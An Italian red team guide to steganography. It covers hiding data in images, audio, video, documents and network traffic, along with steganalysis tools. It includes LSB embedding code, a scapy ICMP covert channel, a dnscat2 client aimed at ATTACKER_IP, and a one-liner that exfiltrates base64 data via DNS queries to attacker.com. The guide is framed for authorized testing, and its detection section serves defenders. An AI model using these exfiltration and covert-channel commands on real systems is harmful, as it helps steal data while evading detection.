# Steganography

## Scopo

Questa guida copre tecniche steganografiche per nascondere dati in file multimediali, utilizzate per data exfiltration e covert communication durante operazioni red team.

## Prerequisiti

- Strumenti steganografici
- File carrier (immagini, audio, video)
- Conoscenza formati file
- **Autorizzazione per testing**

---

## Concetti Base

| Termine | Descrizione |
|---------|-------------|
| Cover | File originale (carrier) |
| Payload | Dati da nascondere |
| Stego | File risultante con dati nascosti |
| Steganalysis | Rilevamento steganografia |

---

## Immagini

### Steghide

```bash
# Installazione
apt install steghide

# Nascondi file in immagine
steghide embed -cf image.jpg -ef secret.txt -p password

# Estrai dati
steghide extract -sf image.jpg -p password

# Info
steghide info image.jpg
```

### OpenStego

```bash
# GUI o command line
# Supporta LSB embedding

# Hide
java -jar openstego.jar embed -mf message.txt -cf cover.png -sf stego.png

# Extract
java -jar openstego.jar extract -sf stego.png -xd output/
```

### Zsteg (PNG/BMP)

```bash
# Installazione
gem install zsteg

# Analisi automatica
zsteg image.png

# Check tutti i canali
zsteg -a image.png

# Estrai da canale specifico
zsteg -E "b1,rgb,lsb,xy" image.png > extracted.txt
```

### StegOnline

```bash
# Web tool: https://stegonline.georgeom.net/

# Funzioni:
# - Browse Bit Planes
# - Extract LSB
# - Filters
```

### LSB Embedding Manuale

```python
from PIL import Image

def encode_lsb(image_path, message, output_path):
    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    # Converti messaggio in binario
    binary = ''.join(format(ord(c), '08b') for c in message)
    binary += '00000000'  # Null terminator
    
    new_pixels = []
    idx = 0
    for pixel in pixels:
        if idx < len(binary):
            # Modifica LSB del canale rosso
            new_pixel = ((pixel[0] & 0xFE) | int(binary[idx]),) + pixel[1:]
            new_pixels.append(new_pixel)
            idx += 1
        else:
            new_pixels.append(pixel)
    
    new_img = Image.new(img.mode, img.size)
    new_img.putdata(new_pixels)
    new_img.save(output_path)

def decode_lsb(image_path):
    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    binary = ''
    for pixel in pixels:
        binary += str(pixel[0] & 1)
    
    # Converti in caratteri
    message = ''
    for i in range(0, len(binary), 8):
        byte = binary[i:i+8]
        if byte == '00000000':
            break
        message += chr(int(byte, 2))
    return message
```

---

## Audio

### MP3Stego

```bash
# Encode
encode -E data.txt -P password cover.wav stego.mp3

# Decode
decode -X -P password stego.mp3
```

### OpenPuff

```
# Windows GUI
1. Seleziona carrier (WAV, MP3, etc.)
2. Inserisci payload
3. Imposta password
4. Genera file stego
```

### DeepSound

```
# Windows GUI
# Nascondi file in audio WAV/FLAC/APE

1. Carrier file
2. Secret files
3. Password (opzionale)
4. Encode
```

### Wav Steg

```bash
# Python
pip install stego-lsb

# Hide
stegolsb wavsteg -h -i cover.wav -s secret.txt -o stego.wav

# Extract
stegolsb wavsteg -r -i stego.wav -o extracted.txt -n NUM_BYTES
```

---

## Video

### OpenPuff

```
# Supporta AVI, MP4, etc.
# Same workflow as audio
```

### Steganography in Frames

```python
# Estrai frame
import cv2

video = cv2.VideoCapture('video.mp4')
ret, frame = video.read()
cv2.imwrite('frame.png', frame)

# Applica steganografia immagine a frame
# Riassembla video
```

---

## Documenti

### Snow (Whitespace Steganography)

```bash
# Installazione
apt install stegsnow

# Nascondi in whitespace
stegsnow -C -m "secret message" -p password input.txt output.txt

# Estrai
stegsnow -C -p password output.txt
```

### PDF

```bash
# wbStego
# Nascondi in PDF

# Estrai metadata
exiftool document.pdf
```

### Microsoft Office

```bash
# Documenti OOXML sono ZIP
unzip document.docx -d extracted/

# Nascondi file in struttura
# Modifica relazioni XML
```

---

## Network Steganography

### ICMP Covert Channel

```python
# Sender
from scapy.all import *

def send_covert(data, target):
    for char in data:
        pkt = IP(dst=target)/ICMP()/char
        send(pkt, verbose=0)

# Receiver
sniff(filter="icmp", prn=lambda x: print(chr(x.load[0])) if x.haslayer(Raw) else None)
```

### DNS Covert Channel

```bash
# Dnscat2
# Server
dnscat2-server domain.com

# Client
./dnscat --dns=server=ATTACKER_IP,port=53

# Data exfil via DNS queries
```

### HTTP Headers

```python
# Nascondi dati in header custom
headers = {
    'X-Custom-Data': base64.b64encode(secret_data)
}
requests.get(url, headers=headers)
```

---

## Steganalysis

### Rilevamento

```bash
# StegDetect (JPEG)
stegdetect image.jpg

# Statistical analysis
# Comparare istogrammi cover/stego
```

### Tools

| Tool | Uso |
|------|-----|
| StegExpose | Rilevamento automatico |
| Stegsolve | Analisi visuale |
| Binwalk | Estrazione embedded files |
| Foremost | File carving |

### Binwalk

```bash
# Analizza file embedded
binwalk image.png

# Estrai
binwalk -e image.png

# Raw extraction
binwalk --dd='.*' image.png
```

---

## Data Exfiltration

### Image Upload

```bash
# Nascondi dati in immagine
steghide embed -cf photo.jpg -ef credentials.txt -p password

# Upload su servizio pubblico (Imgur, etc.)
# Download da altra location
```

### DNS Exfil

```bash
# Encode dati in query DNS
echo "secret" | base64 | xargs -I{} nslookup {}.attacker.com

# Server riceve query e decodifica
```

---

## Best Practices

- **Carrier selection**: File appropriato
- **Capacity**: Non superare limiti
- **Encryption**: Prima di embedding
- **Cover traffic**: Mimetizza
- **Detection**: Testa steganalysis

## Riferimenti

- [Steghide](http://steghide.sourceforge.net/)
- [OpenStego](https://www.openstego.com/)
- [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
- [Binwalk](https://github.com/ReFirmLabs/binwalk)
